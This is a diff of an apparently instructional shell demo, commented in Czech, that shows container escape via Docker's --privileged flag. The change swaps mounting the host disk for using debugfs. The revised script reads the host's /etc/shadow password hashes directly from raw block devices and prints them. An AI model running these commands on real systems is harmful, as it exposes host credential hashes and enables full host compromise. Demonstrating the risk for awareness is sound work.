@@ -15,32 +15,25 @@ run docker run --rm --privileged alpine:3.19 sh -c 'apk add --no-cache util-linu
 pause
 
 echo
-say "2) Najdeme kořenový oddíl, připojíme ho a přečteme /etc/shadow hostitele:"
+say "2) Přečteme /etc/shadow hostitele PŘÍMO z disku pomocí debugfs (bez mountování):"
+echo "   (živý kořenový oddíl nejde znovu připojit; debugfs čte ext4 read-only přímo ze zařízení)"
 cat <<'EOS'
 $ docker run --rm --privileged alpine:3.19 sh -c '
-    for d in /dev/sda1 /dev/vda1 /dev/xvda1 /dev/nvme0n1p1; do
-      mkdir -p /mnt/host
-      mount -o ro $d /mnt/host 2>/dev/null \
-        || mount -t ext4 -o ro $d /mnt/host 2>/dev/null || continue
-      [ -f /mnt/host/etc/shadow ] && break
-    done
-    head -n 5 /mnt/host/etc/shadow'
+    apk add --no-cache e2fsprogs-extra >/dev/null 2>&1
+    debugfs -R "cat /etc/shadow" /dev/sda1'   # čte ext4 přímo, read-only, bez mountu
 EOS
 docker run --rm --privileged alpine:3.19 sh -c '
-  apk add --no-cache util-linux >/dev/null 2>&1
-  mkdir -p /mnt/host
-  for d in /dev/sda1 /dev/vda1 /dev/sda2 /dev/vda2 /dev/xvda1 /dev/nvme0n1p1; do
+  apk add --no-cache e2fsprogs-extra >/dev/null 2>&1
+  for d in /dev/sda1 /dev/vda1 /dev/xvda1 /dev/nvme0n1p1 /dev/sda2 /dev/vda2; do
     [ -b "$d" ] || continue
-    # nejdřív autodetekce (util-linux), jinak fallback na ext4 (funguje i s busybox + offline)
-    mount -o ro "$d" /mnt/host 2>/dev/null || mount -t ext4 -o ro "$d" /mnt/host 2>/dev/null || continue
-    if [ -f /mnt/host/etc/shadow ]; then echo "připojeno (read-only): $d"; break; fi
-    umount /mnt/host 2>/dev/null   # špatný oddíl (swap apod.) → zkus další
+    if debugfs -R "cat /etc/shadow" "$d" 2>/dev/null | grep -q ":"; then
+      echo "# čteno z $d přes debugfs (BEZ mountování, read-only):"
+      debugfs -R "cat /etc/shadow" "$d" 2>/dev/null | head -n 5
+      exit 0
+    fi
   done
-  if [ -f /mnt/host/etc/shadow ]; then
-    head -n 5 /mnt/host/etc/shadow
-  else
-    echo "mount se nezdařil — reálná chyba pro /dev/sda1:"; mount -o ro /dev/sda1 /mnt/host
-  fi' || warn "Pokud stále selhává: zjisti typ FS (fdisk -l / blkid) a uprav na mount -t <fs>."
+  echo "debugfs nenašel /etc/shadow — ověř název zařízení (fdisk -l) nebo typ FS"' \
+  || warn "Pokud selhalo: ověř, že se nainstaloval e2fsprogs-extra a sedí zařízení."
 echo
 bad "Root v privileged kontejneru = root na hostiteli. Kompletní kompromitace."
 pause
